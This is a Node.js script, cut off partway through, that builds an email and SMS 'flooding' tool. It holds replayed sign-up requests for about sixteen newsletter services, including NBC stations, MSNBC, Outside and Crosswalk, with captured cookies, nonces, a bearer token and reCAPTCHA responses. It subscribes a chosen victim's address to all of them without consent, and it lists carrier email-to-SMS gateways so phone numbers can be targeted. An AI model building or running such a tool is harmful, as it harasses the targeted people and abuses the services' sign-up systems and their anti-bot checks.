const fetch = require('node-fetch');
const readline = require('readline');
const consola = require('consola');
const colors = require('colors');
colors;

const sites = {
    "crosswalk.com": (email => {
        fetch("https://allpass.salemwebnetwork.com/newsletters/fullsubmission?&emailAddress=" +
            email.replace('@', '%40') + "&firstName=&lastName=&newsletters=4355%2C9944%2C8033%2C4273%2C10779%2C8172%2C10275%2C10117%2C8398%2C4269%2C7132%2C4263%2C6913%2C5132%2C8247%2C5043%2C4299%2C5063%2C8244%2C4374%2C11055%2C4664%2C5163%2C5047%2C5051%2C5166%2C5165%2C5167%2C4576%2C4297%2C4320%2C4285%2C4865%2C6972%2C4653%2C8787%2C5055%2C4283%2C4317%2C5168%2C4377%2C8183%2C4929%2C4759%2C4798%2C9365%2C4787%2C7512%2C4311%2C4395%2C4396%2C4549%2C4702%2C4590%2C5039%2C4708%2C5035%2C4808%2C4272%2C4289%2C8455%2C9014%2C8978%2C8630%2C8579%2C4288%2C4917%2C5160%2C4630%2C10356%2C4281%2C8132%2C10687%2C9913%2C10643%2C7065%2C7326%2C8063%2C8034%2C5027%2C7473%2C8070%2C4582%2C6762%2C9959%2C4392%2C5031%2C7469%2C4750%2C4779%2C8309%2C4601%2C5012%2C4541%2C6782%2C4906%2C4724%2C4537%2C4682%2C4545%2C10230%2C4900%2C4719%2C4712%2C4742%2C8235%2C4405%2C8249%2C5974%2C4642%2C4622%2C4516%2C8212%2C4376%2C4771%2C4398%2C4402%2C4399%2C5117%2C4394%2C4279%2C4913%2C4397%2C5128%2C8446%2C4303%2C8255%2C4605%2C8059%2C4290%2C4404%2C8239%2C4275%2C4557%2C4362%2C4564%2C8123%2C8075%2C4287%2C4885%2C8179%2C4597%2C4738%2C8175%2C8165%2C4291%2C8464&signupLocation=Newsletter%20Page&signupDomain=www.crosswalk.com&signupUrl=%2Fnewsletters%2F&signupPage=2&screen=1360&callback=jQuery111006821587697244988_1616090897561&_=1616090897562", {
            "headers": {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "script",
                "sec-fetch-mode": "no-cors",
                "sec-fetch-site": "cross-site"
            },
            "referrer": "https://www.crosswalk.com/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": null,
            "method": "GET",
            "mode": "cors"
        })
        .then(() => {
            consola.success('Signed up for https://www.crosswalk.com/newsletters/');
        }).catch(err => {
            consola.info('An error occurred while signing up for https://www.crosswalk.com/newsletters/');
            consola.error(err);
        });
    }),
    "outsideonline.com": (email => {
        fetch("https://api.sail-track.com/v1/track/user/signup", {
            "headers": {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "authorization": "Bearer b112a61d8ef97343cade80b6f0a47e18",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "x-lib-version": "v1.0.1"
            },
            "referrer": "https://www.outsideonline.com/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"vars\":{\"signup_date\":\"2021-03-18\",\"move_every_day\":true,\"dispatch\":true,\"what_you_missed\":true,\"bodywork\":true,\"destinations\":true,\"gear_fix\":true,\"watchlist\":true,\"indefinitely_wild\":true,\"deal_fix\":true,\"sponsor\":true,\"source\":\"newsletter-signup_basic-page\"},\"lists\":{\"Master List\":1},\"email\":\"" + email + "\",\"content\":\"cccc1f37572e39b341525e75e4f4f503\"}",
            "method": "POST",
            "mode": "cors"
        }).then(res => {
            return res.json();
        }).then(body => {
            if (body.sailthruHid) {
                return consola.success('Signed up for https://www.outsideonline.com/2063191/outside-magazine-newsletter-signup');
            }
            consola.info('Couldn\'t sign up for https://www.outsideonline.com/2063191/outside-magazine-newsletter-signup');
        }).catch(() => {
            consola.info('Couldn\'t sign up for https://www.outsideonline.com/2063191/outside-magazine-newsletter-signup');
        });
    }),
    "link.wgal.com": (async email => {
        await fetch("https://link.wgal.com/manage/5e3/optout?email=" + email, {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1"
            },
            "referrer": "https://link.wgal.com/manage/5e3/optout?email=" + email,
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "lists%5Bwgal_news_closings%5D=on&lists%5Bwgal_news_afternoon_headlines%5D=on&lists%5Bwgal_matter_of_fact%5D=on&lists%5Bwgal_news_weather_forecast%5D=on&lists%5Bwgal-coronavirus%5D=on&lists%5Bwgal_news_politics%5D=on&lists%5Bwgal_news_local_breaking%5D=on&lists%5Bwgal_news_national_breaking%5D=on&lists%5Bwgal_news_morning_headlines%5D=on&lists%5Bwgal_consumer_news%5D=on&lists%5Bwgal_news_entertainment%5D=on&lists%5Bwgal_weather_alerts_PAC001%5D=on&lists%5Bwgal_weather_alerts_MDC510%5D=on&lists%5Bwgal_weather_alerts_MDC005%5D=on&lists%5Bwgal_weather_alerts_PAC011%5D=on&lists%5Bwgal_weather_alerts_MDC013%5D=on&lists%5Bwgal_weather_alerts_PAC029%5D=on&lists%5Bwgal_weather_alerts_PAC041%5D=on&lists%5Bwgal_weather_alerts_PAC043%5D=on&lists%5Bwgal_weather_alerts_PAC055%5D=on&lists%5Bwgal_weather_alerts_MDC021%5D=on&lists%5Bwgal_weather_alerts_PAC067%5D=on&lists%5Bwgal_weather_alerts_PAC071%5D=on&lists%5Bwgal_weather_alerts_PAC075%5D=on&lists%5Bwgal_weather_alerts_PAC087%5D=on&lists%5Bwgal_weather_alerts_PAC099%5D=on&lists%5Bwgal_weather_alerts_PAC107%5D=on&lists%5Bwgal_weather_alerts_PAC133%5D=on&profile_id=60539c4e0cc4dc404c68680b&st_form_num=0",
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for https://link.wgal.com/join/5e3/signin');
    }),
    "link.wcvb.com": (async email => {
        await fetch("http://link.wcvb.com/manage/5e0/optout?email=" + email, {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "upgrade-insecure-requests": "1"
            },
            "referrer": "http://link.wcvb.com/manage/5e0/optout?email=" + email,
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "lists%5Bwcvb_news_entertainment%5D=on&lists%5Bwcvb_news_local_breaking%5D=on&lists%5Bwcvb_news_weather_forecast%5D=on&lists%5Bwcvb-coronavirus%5D=on&lists%5Bwcvb_consumer_news%5D=on&lists%5Bwcvb_news_morning_headlines%5D=on&lists%5Bwcvb_news_politics%5D=on&lists%5Bwcvb_news_afternoon_headlines%5D=on&lists%5Bwcvb_matter_of_fact%5D=on&lists%5Bwcvb_chronicle%5D=on&lists%5Bwcvb_news_national_breaking%5D=on&lists%5Bwcvb_weather_alerts_MAC001%5D=on&lists%5Bwcvb_weather_alerts_NHC001%5D=on&lists%5Bwcvb_weather_alerts_MAC005%5D=on&lists%5Bwcvb_weather_alerts_NHC005%5D=on&lists%5Bwcvb_weather_alerts_MAC007%5D=on&lists%5Bwcvb_weather_alerts_MAC009%5D=on&lists%5Bwcvb_weather_alerts_NHC011%5D=on&lists%5Bwcvb_weather_alerts_NHC013%5D=on&lists%5Bwcvb_weather_alerts_MAC017%5D=on&lists%5Bwcvb_weather_alerts_MAC019%5D=on&lists%5Bwcvb_weather_alerts_MAC021%5D=on&lists%5Bwcvb_weather_alerts_MAC023%5D=on&lists%5Bwcvb_weather_alerts_NHC015%5D=on&lists%5Bwcvb_weather_alerts_NHC017%5D=on&lists%5Bwcvb_weather_alerts_MAC025%5D=on&lists%5Bwcvb_weather_alerts_VTC025%5D=on&lists%5Bwcvb_weather_alerts_MAC027%5D=on&profile_id=60539d4f2547d0534273649f&st_form_num=0",
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for https://link.wcvb.com/join/5e3/signin');
    }),
    "nbcboston.com/newsletters/": (async email => {
        let hostname = 'nbcboston.com';
        await fetch("https://www." + hostname + "/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-wp-nonce": "9f4456487d",
                "cookie": "s_ppvl=%5B%5BB%5D%5D; AMCV_A8AB776A5245B4220A490D44%40AdobeOrg=-1176276602%7CMCIDTS%7C18705%7CMCMID%7C18762268474502337082463476467281272068; s_ppv=https%253A%2F%2Fwww." + hostname + "%2Fnewsletters%2F%2C100%2C85%2C1367%2C750%2C667%2C1360%2C768%2C1%2CL"
            },
            "referrer": "https://www." + hostname + "/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WBTS_coronavirus\":1,\"WBTS_BreakingNews\":1,\"WBTS_News7am\":1,\"WBTS_NewsNoon\":1,\"WBTS_News5pm\":1,\"WBTS_News11pm\":1,\"WBTS_Weather\":1,\"WBTS_Entertainment\":1,\"WBTS_Investigations\":1,\"WBTS_Contests\":1}}",
            "method": "POST",
            "mode": "cors"
        })
        consola.success('Signed up for https://www.' + hostname + '/newsletters/');
    }),
    "nbcnewyork.com/newsletters/": (async email => {
        await fetch("https://www.nbcnewyork.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-wp-nonce": "9f4456487d"
            },
            "referrer": "https://www.nbcnewyork.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WNBC_News7am\":1,\"WNBC_News11pm\":1,\"WNBC_Contests\":1,\"WNBC_BreakingNews\":1,\"WNBC_Weather\":1,\"WNBC_Olympics\":1}}",
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for https://www.nbcnewyork.com/newsletters/');
    }),
    "nbcchicago.com/newsletters/": (async email => {
        await fetch("https://www.nbcchicago.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-wp-nonce": "9f4456487d"
            },
            "referrer": "https://www.nbcchicago.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WMAQ_coronavirus\":1,\"WMAQ_News7am\":1,\"WMAQ_Noon\":1,\"WMAQ_News8pm\":1,\"WMAQ_BreakingNews\":1,\"WMAQ_Weather\":1,\"WMAQ_Sports\":1,\"WMAQ_Entertainment\":1,\"WMAQ_Contests\":1,\"WMAQ_Olympics\":1}}",
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for https://www.nbcchicago.com/newsletters/');
    }),
    "nbcbayarea.com/newsletters/": (async email => {
        await fetch("https://www.nbcbayarea.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-wp-nonce": "9f4456487d",
                "cookie": "AMCV_A8AB776A5245B4220A490D44%40AdobeOrg=-1176276602%7CMCIDTS%7C18705; s_ppvl=%5B%5BB%5D%5D; s_ppv=https%253A%2F%2Fwww.nbcbayarea.com%2Fnewsletters%2F%2C42%2C77%2C1267%2C664%2C667%2C1360%2C768%2C1%2CP"
            },
            "referrer": "https://www.nbcbayarea.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"kntv_coronavirus\":1,\"KNBC_News7am\":1,\"KNBC_NewsNoon\":1,\"KNBC_News5pm\":1,\"KNBC_BreakingNews\":1,\"KNBC_Weather\":1,\"KNBC_Sports\":1,\"KNBC_Entertainment\":1,\"KNBC_Contests\":1,\"KNBC_Olympics\":1}}",
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for https://www.nbcbayarea.com/newsletters/');
    }),
    "nbclosangeles.com/newsletters/": (async email => {
        await fetch("https://www.nbclosangeles.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-wp-nonce": "9f4456487d"
            },
            "referrer": "https://www.nbclosangeles.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"KNBC_News7am\":1,\"KNBC_NewsNoon\":1,\"KNBC_News5pm\":1,\"KNBC_BreakingNews\":1,\"KNBC_Weather\":1,\"KNBC_Sports\":1,\"KNBC_Entertainment\":1,\"KNBC_Contests\":1,\"KNBC_Olympics\":1}}",
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for https://www.nbclosangeles.com/newsletters/');
    }),
    "nbcsandiego.com/newsletters/": (async email => {
        await fetch("https://www.nbcsandiego.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-wp-nonce": "9f4456487d"
            },
            "referrer": "https://www.nbcsandiego.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"KNSD_coronavirus\":1,\"KNSD_News7am\":1,\"KNSD_NewsNoon\":1,\"KNSD_News6pm\":1,\"KNSD_BreakingNews\":1,\"KNSD_Weather\":1,\"KNSD_Sports\":1,\"KNSD_TheScene\":1,\"KNSD_Contests\":1,\"KNSD_SoundDiego\":1,\"KNSD_SoundDiegoPlatinum\":1,\"KNSD_WorthTheTrip\":1}}",
            "method": "POST",
            "mode": "cors",
            "credentials": "include"
        });
        consola.success('Signed up for https://www.nbcsandiego.com/newsletters/');
    }),
    "nbcconnecticut.com/newsletters/": (async email => {
        await fetch("https://www.nbcconnecticut.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-wp-nonce": "9f4456487d",
                "cookie": "AMCV_A8AB776A5245B4220A490D44%40AdobeOrg=-1176276602%7CMCIDTS%7C18705; s_ppvl=%5B%5BB%5D%5D; s_ppv=https%253A%2F%2Fwww.nbcconnecticut.com%2Fnewsletters%2F%2C43%2C87%2C1367%2C664%2C667%2C1360%2C768%2C1%2CP"
            },
            "referrer": "https://www.nbcconnecticut.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WVIT_coronavirus\":1,\"WVIT_News7am\":1,\"WVIT_NewsNoon\":1,\"WVIT_News8p\":1,\"WVIT_BreakingNews\":1,\"WVIT_Weather\":1,\"WVIT_Contest\":1,\"WVIT_Entertainment\":1,\"WVIT_Olympics\":1}}",
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for https://www.nbcconnecticut.com/newsletters/');
    }),
    "nbcwashington.com/newsletters/": (async email => {
        await fetch("https://www.nbcwashington.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-wp-nonce": "9f4456487d"
            },
            "referrer": "https://www.nbcwashington.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WRC_coronavirus\":1,\"WRC_News7am\":1,\"WRC_NewsNoon\":1,\"WRC_News8pm\":1,\"WRC_Olympics\":1,\"WRC_BreakingNews\":1,\"WRC_Contests\":1,\"WRC_Sports\":1,\"WRC_Entertainment\":1,\"WRC_Weather\":1}}",
            "method": "POST",
            "mode": "cors",
            "credentials": "include"
        });
        consola.success('Signed up for https://www.nbcwashington.com/newsletters/');
    }),
    "nbcdfw.com/newsletters/": (async email => {
        await fetch("https://www.nbcdfw.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-wp-nonce": "9f4456487d",
                "cookie": "AMCVS_A8AB776A5245B4220A490D44%40AdobeOrg=1; s_ppvl=%5B%5BB%5D%5D; s_ppv=https%253A%2F%2Fwww.nbcdfw.com%2Fnewsletters%2F%2C44%2C100%2C1629%2C664%2C667%2C1360%2C768%2C1%2CLP; AMCV_A8AB776A5245B4220A490D44%40AdobeOrg=-1176276602%7CMCIDTS%7C18705%7CMCMID%7C54062411166253792013078203019419095612%7CMCAID%7CNONE%7CMCOPTOUT-1616114845s%7CNONE; nbcu_prepagename=newsletters%3Anewsletters%20landing%3Asection%20landing%20page; SC_LINKS=%5B%5BB%5D%5D; s_vnum=1617249600963%26vn%3D1; s_invisit=true; nbcu_dayslastvisit=1616107645964; nbcu_dayslastvisit_s=First%20Visit; s_cc=true; s_nr=1616107902900-New; s_sq=nbcuotsdivisiontotal%3D%2526pid%253Dnewsletters%25253Anewsletters%252520landing%25253Asection%252520landing%252520page%2526pidt%253D1%2526oid%253DSave%252520Changes%2526oidt%253D3%2526ot%253DSUBMIT"
            },
            "referrer": "https://www.nbcdfw.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"KXAS_coronavirus\":1,\"KXAS_News7am\":1,\"KXAS_NewsNoon\":1,\"KXAS_News8pm\":1,\"KXAS_BreakingNews\":1,\"KXAS_Weather\":1,\"KXAS_Entertainment\":1,\"KXAS_Announcements\":1,\"KXAS_Investigations\":1,\"KXAS_Contests\":1}}",
            "method": "POST",
            "mode": "cors"
        });
        return consola.success('Signed up for https://www.nbcdfw.com/newsletters/');
    }),
    "nbcphiladelphia.com/newsletters/": (async email => {
        await fetch("https://www.nbcphiladelphia.com/wp-json/nbc/v1/subscriber/update/?_locale=user", {
            "headers": {
                "accept": "application/json, */*;q=0.1",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-wp-nonce": "9f4456487d"
            },
            "referrer": "https://www.nbcphiladelphia.com/newsletters/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "{\"email\":\"" + email + "\",\"fname\":\"AAAAAA\",\"lname\":\"BBBBBB\",\"zip\":\"22222\",\"sex\":\"female\",\"lists\":{\"WCAU_wawa\":1,\"WCAU_News7am\":1,\"WCAU_NewsNoon\":1,\"WCAU_News8pm\":1,\"WCAU_BreakingNews\":1,\"WCAU_Weather\":1,\"WCAU_Sports\":1,\"WCAU_Entertainment\":1,\"WCAU_Olympics\":1,\"WCAU_Contests\":1,\"WCAU_Announcements\":1}}",
            "method": "POST",
            "mode": "cors",
            "credentials": "include"
        });
        return consola.success('Signed up for https://www.nbcphiladelphia.com/newsletters/');
    }),
    "http://link.msnbc.com/join/5ck/msnbc-updates-signup": (async email => {
        await fetch("http://link.msnbc.com/join/5ck/msnbc-updates-signup", {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "upgrade-insecure-requests": "1",
                "cookie": "AMCVS_A8AB776A5245B4220A490D44%40AdobeOrg=1; s_vnum=1618686145030%26vn%3D1; s_invisit=true; s_cc=true; prevVal_pn=msnbc%3Aemail%3ASign%20up%20for%20the%20Show%20Updates%2C%20Special%20Events%20%26%20Offers%20newsletter%20%7C%20NBC%20News; s_sq=msnbcdotcom%3D%2526c.%2526a.%2526activitymap.%2526page%253Dmsnbc%25253Aemail%25253ASign%252520up%252520for%252520the%252520Show%252520Updates%25252C%252520Special%252520Events%252520%252526%252520Offers%252520newsletter%252520%25257C%252520NBC%252520News%2526link%253DSIGN%252520UP%2526region%253DBODY%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253Dmsnbc%25253Aemail%25253ASign%252520up%252520for%252520the%252520Show%252520Updates%25252C%252520Special%252520Events%252520%252526%252520Offers%252520newsletter%252520%25257C%252520NBC%252520News%2526pidt%253D1%2526oid%253DSIGN%252520UP%2526oidt%253D3%2526ot%253DSUBMIT; AMCV_A8AB776A5245B4220A490D44%40AdobeOrg=1585540135%7CMCIDTS%7C18705%7CMCMID%7C19498945692468480643899592547967251642%7CMCAID%7CNONE%7CMCOPTOUT-1616102058s%7CNONE%7CvVersion%7C4.4.0"
            },
            "referrer": "http://link.msnbc.com/join/5ck/msnbc-updates-signup&hash=37d894cccdf4b3f89cc88dac8272a18b",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "email=" + email.replace('@', '%40') + "&lists%5BMaster%5D=1&vars%5Bsub_msnbcupdates%5D=1&vars%5Bsource%5D=signup-page&g-recaptcha-response=03AGdBq27AKlSQqnwkXjRcumtv2Az3CHHOv9cGNC2tpq2AahGSs1EYPvWzNk5KKcKiQsIdE1CMBsUD3pu_qsrdrJfhFKxJRiVR3TJk2t1wyRoA2n2FjsoCQ3FO4W7n7-NK6WQYY7JMmSumV2dqNDuWOKJpNE1F9bm2xYuI9thwoCzGj8fQIh7PTnaho4bu9bXqkHtDezAHk9OwUbyE77mw_tib6caAS-iz52AEVmgYDV-qJc35izvv7I9Q_fUlh8Y5G27p58_kbyfZe_mjaoQ62-1zl_ne4XQDK7dXB4Io_gr1dVr9sYHbOmK_78ZKUP66GVSTwuGff0bhZIJbLNYuD4BaRe3HetqCHvBPiwo7GQb8HJ4GukOtdkYNVcrF6nmJ_Pa1G5XBGpaWtUi_gqEeoy_Z-63vv5Rtfd5iG_jf4o9A7RFnD7WYiaeot1RhZT9wIDGIw2Cu21T4&nonce_6053a65a2c778=6053a65a2c779&profile_id=591edf3bade9c297078b4594&st_form_num=0",
            "method": "POST",
            "mode": "cors"
        });
        consola.success('Signed up for http://link.msnbc.com/join/5ck/msnbc-updates-signup');
    }),
    "contacts.nbc.ca": (async email => {
        await fetch("https://www.contacts.nbc.ca/newsletter/subscription?vs=OTZkNmNiNTktOTg2NS00ZWI4LWIzOTQtZjkwNTM1YTA1YzdlOzsS1", {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "max-age=0",
                "content-type": "application/x-www-form-urlencoded",
                "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1"
            },
            "referrer": "https://www.contacts.nbc.ca/newsletter/subscription",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": "surname=AAAAA&givenName=BBBBB&Email=" + email.replace('@', '%40') + "&ConfirmEmail=" + email.replace('@', '%40') + "&languageCode=En&Finance_banking=1&Investment_stock=1&Business_world=1&Int_BNC_Daily_FX=1&Int_BNC_Hebdo_Economique=1&Int_BNC_Hebdo_Energy=1&Courtage_direct=1&Accept_Politique=1&Accept_Infolettre=1&g-recaptcha-response=03AGdBq269E4DK-OLXEG4AyE-dp7JW835RpoVkWwQD8pWyTCt3oxUYf57pNe9qAcYiEUOfRPMZI78hlvTcNwaAb1qwrbuqzcAQ6tTDote8DxG8izH9ojeKLoMGXPfaVHd89gbZNinJyZtdjeinRCyFq0FQO62GmSuy8-CsAEC64NSEHIoxs-4pVDnZElguZ-6pGoPQbd-oq_XO985wpQfTvTKIZVgj96sp0UvzL6ycSy0YVUJaMYJV8B6bCuj25TYwGpnMg5DcmCfoHiKBrjwRQVwMNO23lW9V_UxWscZJpqqYrZoOsZmvEQt0-gJsVJ9YVgtEotE_tc_sCmzQzuZCHHEcAaMeh3os2D_o_WwmcF3talIRGFOeDkudbrQ3WMU3MhBsS5P8p0-CCwQTcy3c5hhdRLgD9oBj_it3k4NcwFPkTcVCLeAQ9BuCpeAdMVHNdlj7V9KftOfZLzMEzFH-N0VOuKAXAxgwPA&confirmer=Confirm&notificationId=368486&templtPurpsCd=NewsLetter&formSourceName=StandardForm&sp_exp=yes",
            "method": "POST",
            "mode": "cors",
            "credentials": "include"
        });
        consola.success('Signed up for https://www.contacts.nbc.ca/newsletter/subscription');
    })
}

const floodall = async enteredEmail => {
    for (const key in sites) {
        await sites[key](enteredEmail);
    }
}

const start = async () => {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    console.log(
        ` * Alltel: phone#@message.alltel.com
 * AT&T: phone#@txt.att.net
 * T-Mobile: phone#@tmomail.net
 * Virgin Mobile: phone#@vmobl.com
 * Sprint: phone#@messaging.sprintpcs.com
 * Verizon: phone#@vtext.com
 * Nextel: phone#@messaging.nextel.com
 * US Cellular: phone#@mms.uscc.net\n`
    );
    rl.question('What email would you like to flood?'.underline + ' ', async enteredEmail => {
